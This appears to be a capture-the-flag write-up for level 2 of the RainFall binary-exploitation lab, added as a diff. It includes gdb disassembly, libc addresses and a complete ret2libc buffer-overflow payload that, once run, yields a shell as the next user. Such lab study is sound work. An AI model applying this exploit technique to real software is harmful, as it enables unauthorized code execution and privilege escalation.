@@ -1,1 +1,93 @@
-There is a buffer in the function p that starts at the address 0xbffff6ac
+# The target binary is vulnerable to a buffer overflow exploit :
+Dump of assembler code for function p:
+	0x080484d4 <+0>:	push   %ebp
+	0x080484d5 <+1>:	mov    %esp,%ebp
+	0x080484d7 <+3>:	sub    $0x68,%esp
+	0x080484da <+6>:	mov    0x8049860,%eax
+	0x080484df <+11>:	mov    %eax,(%esp)
+	0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
+	0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax <==
+	0x080484ea <+22>:	mov    %eax,(%esp)
+	0x080484ed <+25>:	call   0x80483c0 <gets@plt>
+
+# As we can see, an address is loaded into eax at offset -0x4c(%ebp),
+# which translates to 76(10). The following instruction moves the value in %eax
+# on the stack, and then a call to gets is made.
+
+# Contrary to level1, right after, a check is made by the program to see if
+# the return address of the function is on the stack.
+# This instruction moves the value at ebp+4
+# (where the return address of p() is stored) into the eax register : 
+
+	0x080484f2 <+30>:	mov    0x4(%ebp),%eax <==
+
+# Then there is a comparison with the value contained in eax and the value
+# 0xb00000000.
+
+	0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
+	0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
+	0x080484fb <+39>:	and    $0xb0000000,%eax
+	0x08048500 <+44>:	cmp    $0xb0000000,%eax
+
+# If the return address is superior or equal to 12 * (2 ^ 7), a call to printf()
+# is made, then exit() :
+
+	0x08048505 <+49>:	jne    0x8048527 <p+83>
+	0x08048507 <+51>:	mov    $0x8048620,%eax
+	0x0804850c <+56>:	mov    -0xc(%ebp),%edx
+	0x0804850f <+59>:	mov    %edx,0x4(%esp)
+	0x08048513 <+63>:	mov    %eax,(%esp)
+	0x08048516 <+66>:	call   0x80483a0 <printf@plt>
+	0x0804851b <+71>:	movl   $0x1,(%esp)
+	0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
+
+# The only approach that was succesful for us is a ret2libc exploit.
+# First, we need to find the addresses of libc's functions system() and exit() :
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+
+# As you can see, system's address is superior to 0xb0000000,
+# meaning we cannot use it to overwrite the return address of p().
+# What we can do here is get the address of the ret instruction in p():
+
+	0x0804853e <+106>:	ret
+
+# The idea is to trick the program into running system('/bin/sh'), then exit().
+# Then, we need to store somewhere the address of the string '/bin/sh'.
+# A quick and easy way is to export it in the environment :
+
+export SHELL=/bin/sh
+
+# We can get the address of the string, by using a small c program that prints
+# the wanted environment variable :
+
+#include <stdio.h>
+#include <string.h>
+void main(int argc, char **argv) {
+	if (argc == 2 && strcmp(argv[1], 'SHELL'))
+		printf('%p\n', getenv(argv[1]));
+}
+
+# Now that we have everything, let's build the payload.
+# As you may know, when calling a function, its argument list is expected 
+# to start at the offset $ebp + 8. This is what the payload will look like :
+
+[ Padding (76 + 4 bytes) ] [ 'A' * 80 ]
+[ New return address ] [ 0x0804853e ]
+[ Address of system() ] [ 0xb7e6b060 ]
+[ Address of exit() ] [ 0xb7e5ebe0 ]
+[ Address of '/bin/sh' ] [ 0xbffff90e ]
+
+# Finally, the result (every address is little endian, hence the import) :
+level2@RainFall:~$ python -c "import struct;
+ret = struct.pack('I', 0x804853e)
+system = struct.pack('I', 0xb7e6b060)
+exit = struct.pack('I', 0xb7e5ebe0)
+string = struct.pack('I', 0xbffff90e)
+print 'A' * 80 + ret + system + exit + string" > /tmp/payload
+level2@RainFall:~$ cat /tmp/payload - | ./level2
+whoami
+level3
